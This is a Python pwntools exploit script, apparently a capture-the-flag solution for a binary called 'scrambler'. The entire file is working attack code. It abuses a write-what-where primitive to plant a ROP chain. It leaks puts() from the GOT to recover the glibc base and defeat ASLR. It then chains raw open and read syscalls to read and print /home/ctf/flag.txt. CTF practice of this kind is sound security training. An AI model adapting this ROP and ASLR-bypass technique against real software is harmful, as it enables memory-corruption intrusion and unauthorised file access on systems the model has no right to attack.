#!/usr/bin/env python3

from pwn import context, ELF, log, p64, remote, sys, u64

elf = ELF('scrambler_patched')
glibc = ELF('libc.so_1.6', checksec=False)

context.binary = elf


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


def write_what_where(p, what: int, where: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'arg1 = \n> ', b'1')
    p.sendlineafter(b'arg2 = \n> ', str(where).encode())
    p.sendlineafter(b'arg3 = \n> ', str(what).encode())


def main():
    p = get_process()

    pop_rdi_ret = 0x4015c3
    pop_rbp_ret = 0x40125d
    new_rbp     = 0x404200
    while_addr  = 0x401400

    payload  = p64(pop_rdi_ret + 1)
    payload += p64(pop_rdi_ret)
    payload += p64(elf.got.puts)
    payload += p64(elf.plt.puts)
    payload += p64(pop_rbp_ret)
    payload += p64(new_rbp)
    payload += p64(while_addr)

    write_what_where(p, 0x80, -1)

    for i, b in enumerate(payload):
        write_what_where(p, b, 0x20 + 8 + i)

    p.sendlineafter(b'> ', b'2')
    p.recvline()
    puts_addr = u64(p.recvline().strip().ljust(8, b'\0'))

    log.info(f'Leaked puts() address: {hex(puts_addr)}')

    glibc.address = puts_addr - glibc.sym.puts
    log.info(f'Glibc base address: {hex(glibc.address)}')

    write_what_where(p, 0x87, -0x200 + 0x38 + 0x20)
    write_what_where(p, 0x13, -0x200 + 0x38 + 0x20 + 1)

    mov_qword_ptr_rax_rdi_ret = glibc.address + 0x09a0ff
    pop_rax_ret               = glibc.address + 0x047400
    pop_rsi_ret               = glibc.address + 0x02604f
    pop_rdx_pop_r12_ret       = glibc.address + 0x119241
    pop_rcx_pop_rbx_ret       = glibc.address + 0x1025ae
    syscall                   = glibc.address + 0x118750

    flag = b'/home/ctf/flag.txt'
    flag = flag.ljust(len(flag) + (8 - len(flag) % 8), b'\0')
    writable_addr = 0x404000

    payload = b''

    # Store "/home/ctf/flag.txt" in 0x404000
    for i in range(0, len(flag), 8):
        payload += p64(pop_rdi_ret)
        payload += flag[i:i + 8]
        payload += p64(pop_rax_ret)
        payload += p64(writable_addr + i)
        payload += p64(mov_qword_ptr_rax_rdi_ret)

    # syscall: open("/home/ctf/flag.txt", 0)
    payload += p64(pop_rdi_ret)
    payload += p64(2)                         # rdi (rax)
    payload += p64(pop_rsi_ret)
    payload += p64(writable_addr)             # rsi (rdi)
    payload += p64(pop_rdx_pop_r12_ret)
    payload += p64(0)                         # rdx (rsi)
    payload += p64(0)
    payload += p64(syscall)

    # syscall: read(3, writable_addr, 0x100)
    payload += p64(pop_rdi_ret)           
    payload += p64(0)                         # rdi (rax)            
    payload += p64(pop_rsi_ret)
    payload += p64(3)                         # rsi (rdi)
    payload += p64(pop_rdx_pop_r12_ret)
    payload += p64(writable_addr)             # rdx (rsi)
    payload += p64(0)
    payload += p64(pop_rcx_pop_rbx_ret)
    payload += p64(0x100)                     # rcx (rdx)
    payload += p64(0)
    payload += p64(syscall)

    payload += p64(pop_rdi_ret)
    payload += p64(writable_addr)
    payload += p64(glibc.sym.puts)

    write_what_where(p, 0x80, -1)

    for i, b in enumerate(payload):
        write_what_where(p, b, 0x20 + 8 + i)

    p.sendlineafter(b'> ', b'2')
    p.interactive()


if __name__ == '__main__':
    main()
